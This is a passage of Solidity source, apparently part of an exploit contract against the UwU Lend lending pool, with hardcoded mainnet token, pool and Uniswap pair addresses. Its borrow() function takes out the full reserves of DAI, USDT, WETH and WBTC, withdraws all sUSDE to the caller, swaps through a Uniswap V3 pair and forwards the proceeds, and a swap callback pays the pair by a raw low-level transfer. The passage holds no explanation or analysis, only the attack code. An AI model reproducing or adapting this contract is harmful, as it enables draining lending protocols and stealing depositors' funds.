    IERC20Min constant uWBTC = IERC20Min(0x6Ace5c946a3Abd8241f31f182c479e67A4d8Fc8d);
    IERC20Min constant uDAI = IERC20Min(0xb95BD0793bCC5524AF358ffaae3e38c3903C7626);
    IERC20Min constant USDT = IERC20Min(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Min constant uUSDT = IERC20Min(0x24959F75d7BDA1884f1Ec9861f644821Ce233c7D);
    IUniPairV3Min constant USDT_WETH_Pair = IUniPairV3Min(0x11b815efB8f581194ae79006d24E0d814B7697F6);

    function borrow() external {
        uwuLendPool.borrow(address(DAI), DAI.balanceOf(address(uDAI)), 2, 0, address(this));
        uwuLendPool.borrow(address(USDT), USDT.balanceOf(address(uUSDT)), 2, 0, address(this));
        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)), 2, 0, address(this));
        uwuLendPool.borrow(address(WBTC), WBTC.balanceOf(address(uWBTC)), 2, 0, address(this));
        uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), msg.sender);

        USDT_WETH_Pair.swap(
            address(this), false, int256(USDT.balanceOf(address(this))), 5_334_772_629_276_810_319_154_680, new bytes(0)
        );
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        address(USDT).call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), msg.sender, uint256(amount1Delta))
        );
    }
}
